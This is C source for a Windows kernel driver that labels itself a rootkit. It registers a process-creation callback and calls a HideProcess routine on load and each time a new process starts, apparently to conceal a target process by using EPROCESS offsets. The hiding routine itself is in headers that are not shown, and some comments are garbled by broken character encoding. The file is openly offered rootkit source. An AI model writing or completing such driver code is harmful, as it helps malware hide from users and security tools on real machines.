#include <ntddk.h>
#include "Hide.h"
#include "Offset.h"

VOID ProcessCreateCallback(
	_In_	HANDLE parentPid,
	_In_	HANDLE processId,
	_In_	BOOLEAN isCreate
)
{
	UNREFERENCED_PARAMETER(parentPid);

	if (isCreate)
	{
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "[Rootkit] New process detected. (PID: %u) Finding target process.\n", PtrToUint(processId));
		HideProcess();
	}
}

VOID OnUnload(
	_In_	PDRIVER_OBJECT driverObject
)
{
	UNREFERENCED_PARAMETER(driverObject);
	PsSetCreateProcessNotifyRoutine(ProcessCreateCallback, TRUE);
	DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "[Rootkit] Unloading driver.\n");
}

NTSTATUS
DriverEntry(
	_In_	PDRIVER_OBJECT pDriverObject,
	_In_	PUNICODE_STRING pRegistryPath)
{
	UNREFERENCED_PARAMETER(pDriverObject);
	UNREFERENCED_PARAMETER(pRegistryPath);

	if (InitializeOffsets() == FALSE)
	{
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "[Rootkit] Failed to get EPROCESS offsets.\n");
		return STATUS_FAILED_DRIVER_ENTRY;
	}

	// ���μ��� ���� ���� �� ����� ���� �ݹ��Լ� ��ƾ ���
	NTSTATUS status = PsSetCreateProcessNotifyRoutine(ProcessCreateCallback, FALSE);
	if (!NT_SUCCESS(status))
	{
		DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "[Rootkit] PsSetCreateProcessNotifyRoutine failed.\n");
		return STATUS_FAILED_DRIVER_ENTRY;
	}
	
	HideProcess();

	// ��ε� ��ƾ ���
	pDriverObject->DriverUnload = OnUnload;

	return STATUS_SUCCESS;
}